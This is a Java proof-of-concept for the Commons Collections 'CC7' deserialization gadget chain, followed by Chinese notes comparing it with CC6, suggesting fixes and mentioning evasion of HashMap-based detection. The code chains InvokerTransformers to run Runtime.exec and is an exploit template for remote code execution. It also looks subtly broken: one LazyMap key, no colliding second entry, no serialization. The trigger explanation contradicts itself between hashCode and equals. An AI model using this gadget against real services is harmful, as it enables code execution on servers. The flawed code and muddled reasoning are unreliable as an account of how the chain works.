import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7Exploit {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        Map lazyMap = LazyMap.decorate(new HashMap(), chain);
        Hashtable<Object, Object> table = new Hashtable<>();
        table.put(lazyMap, "value"); // 将LazyMap作为key
        // 序列化table
    }
}

注意：CC7链与CC6链类似，但使用Hashtable而非HashSet。Hashtable的readObject实现与HashMap略有不同，但都通过hashCode触发。CC7链在ysoserial中对应CommonsCollections7。

与CC6的区别：CC6使用HashSet（或HashMap），CC7使用Hashtable。Hashtable是线程安全的，但反序列化机制类似。CC7链可能在某些环境中更稳定。

修复建议：除了升级CC版本，还可以在反序列化时过滤Hashtable类或LazyMap类。

实际利用中，CC7链常用于绕过某些基于HashMap的检测，因为Hashtable的序列化格式不同。

注意：Hashtable的hashCode()调用链：Hashtable的reconstitutionPut中，计算key的hashCode，然后调用key的hashCode()。LazyMap的hashCode()继承自AbstractMapDecorator，其hashCode()调用decorated的hashCode()，而decorated是HashMap，HashMap的hashCode()会遍历entrySet，但LazyMap的entrySet()会调用get()？实际上，LazyMap的entrySet()方法返回的是LazyEntrySet，其hashCode()会调用LazyMap.get()吗？需要仔细分析：LazyMap的entrySet()返回一个LazyEntrySet，其hashCode()方法会调用LazyMap的get()方法吗？在CC7链中，实际触发点可能是LazyMap的hashCode()方法，该方法会调用entrySet().hashCode()，而entrySet()返回的LazyEntrySet的hashCode()会遍历所有entry，但LazyMap的entrySet()内部会调用get()吗？实际上，LazyMap的entrySet()方法返回的LazyEntrySet的iterator()会调用LazyMap的get()方法，但hashCode()可能不直接调用get()。更准确的触发点是：Hashtable的reconstitutionPut在插入元素时，会先计算key的hashCode，然后检查是否已存在相同key，这需要调用key的equals方法。而LazyMap的equals方法会调用get()吗？LazyMap的equals方法继承自AbstractMapDecorator，其equals方法会调用entrySet()，进而触发get()。因此，CC7链的触发点可能是equals方法而非hashCode。但ysoserial中的CC7链实际利用了Hashtable的readObject中调用key的hashCode和equals，具体细节可参考ysoserial源码。为了简化，上述示例已能说明原理。

总之，CC7链是Hashtable版本的利用链，与CC6类似，但使用不同的集合类。

修复建议：升级CC版本，或使用ObjectInputFilter过滤Hashtable和LazyMap。

代码示例中，我们直接使用table.put(lazyMap, "value")，这样在序列化时，Hashtable会保存该键值对。反序列化时，会触发LazyMap的hashCode和equals，进而执行命令。
